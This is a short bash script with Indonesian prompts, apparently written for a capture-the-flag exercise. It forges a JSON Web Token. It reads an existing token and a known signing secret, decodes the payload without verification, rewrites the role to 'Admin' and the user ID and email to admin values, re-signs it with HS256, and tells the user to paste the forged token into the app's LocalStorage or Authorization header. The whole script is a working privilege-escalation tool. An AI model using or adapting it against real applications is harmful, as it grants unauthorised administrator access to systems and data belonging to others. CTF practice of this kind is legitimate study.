#!/usr/bin/env bash

set -e

echo "[+] Membuat / menggunakan virtualenv..."
python3 -m venv venv 2>/dev/null || true
source venv/bin/activate

echo "[+] Install pyjwt jika belum ada..."
pip install --quiet pyjwt

read -p "Masukkan JWT lama: " TOKEN
read -p "Masukkan SECRET (server secret / CTF secret): " SECRET

echo "[+] Decode JWT tanpa verifikasi..."
HEADER=$(echo "$TOKEN" | cut -d. -f1)
PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)

decode() {
  local DATA=$1
  local PAD=$((4 - ${#DATA} % 4))
  [[ $PAD -lt 4 ]] && DATA="$DATA$(printf '=%.0s' $(seq 1 $PAD))"
  echo "$DATA" | base64 -d 2>/dev/null
}

ORIG_PAYLOAD=$(decode "$PAYLOAD")

echo "Payload asli:"
echo "$ORIG_PAYLOAD"

echo "[+] Membuat payload baru (Admin mode)..."
NEW_PAYLOAD=$(python - <<EOF
import json
p = json.loads('''$ORIG_PAYLOAD''')
p["role"] = "Admin"
if "userId" in p: p["userId"] = 2
if "email" in p: p["email"] = "admin"
print(json.dumps(p))
EOF
)

echo "Payload baru:"
echo "$NEW_PAYLOAD"

echo "[+] Generate JWT baru..."
NEW_TOKEN=$(python - <<EOF
import jwt, json
payload = json.loads('''$NEW_PAYLOAD''')
print(jwt.encode(payload, "$SECRET", algorithm="HS256"))
EOF
)

echo ""
echo "===================="
echo " JWT BARU (VALID)"
echo "===================="
echo "$NEW_TOKEN"
echo ""
echo "[!] Tempelkan ke LocalStorage / Authorization header sesuai aplikasi."
